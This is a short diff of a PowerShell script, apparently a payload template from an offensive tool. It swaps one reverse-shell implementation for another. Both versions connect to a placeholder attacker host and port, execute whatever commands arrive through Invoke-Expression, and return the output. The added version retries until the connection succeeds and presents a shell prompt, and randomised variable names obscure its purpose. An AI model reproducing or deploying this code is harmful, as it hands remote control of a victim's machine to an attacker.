@@ -1,6 +1,3 @@
-$DXxkrwHgjd='SERVER_EXTERNAL_IP';$OPSqlJlDEg=SERVER_EXTERNAL_PORT;
-$AsDzYCyLzW=(New-Object Net.Sockets.TCPClient($DXxkrwHgjd,$OPSqlJlDEg)).GetStream();
-[byte[]]$IqckfWMkEB=0..65535|%{0};
-while(($eUyaStMAXH=$AsDzYCyLzW.Read($IqckfWMkEB,0,$IqckfWMkEB.Length)) -ne 0){;$kIwypYQIZs=(New-Object Text.ASCIIEncoding).GetString($IqckfWMkEB,0,$eUyaStMAXH);
-$tmdFZtJnEQ=([text.encoding]::ASCII).GetBytes((iex $kIwypYQIZs 2>&1));
-$AsDzYCyLzW.Write($tmdFZtJnEQ,0,$tmdFZtJnEQ.Length)};
+do {Start-Sleep -Seconds 1;try{$iATESVpYVf='SERVER_EXTERNAL_IP';$ClcgHjKJSQ=SERVER_EXTERNAL_PORT;$MsUpPepcLY = New-Object Net.Sockets.TCPClient($iATESVpYVf,$ClcgHjKJSQ)}catch{}}until($MsUpPepcLY.Connected)
+$opgewLkIov = $MsUpPepcLY.GetStream();$TTabqtbgFY = New-Object IO.StreamWriter($opgewLkIov);function ZbDQdlhtWBaw($string){[byte[]]$script:Buffer= 0..$MsUpPepcLY.ReceiveBufferSize | % {0};$TTabqtbgFY.Write($string+'PS> ');$TTabqtbgFY.Flush()};ZbDQdlhtWBaw '';
+while(($IfTUqtCnGu = $opgewLkIov.Read($buffer,0, $buffer.Length)) -gt 0){$SWCjSEYcNh=([text.encoding]::UTF8).GetString($buffer,0,$IfTUqtCnGu - 1);$BxcxLleqEe=try{Invoke-Expression $SWCjSEYcNh 2>&1 | Out-String}catch{$_ | Out-String};ZbDQdlhtWBaw ($BxcxLleqEe);};$TTabqtbgFY.Close();
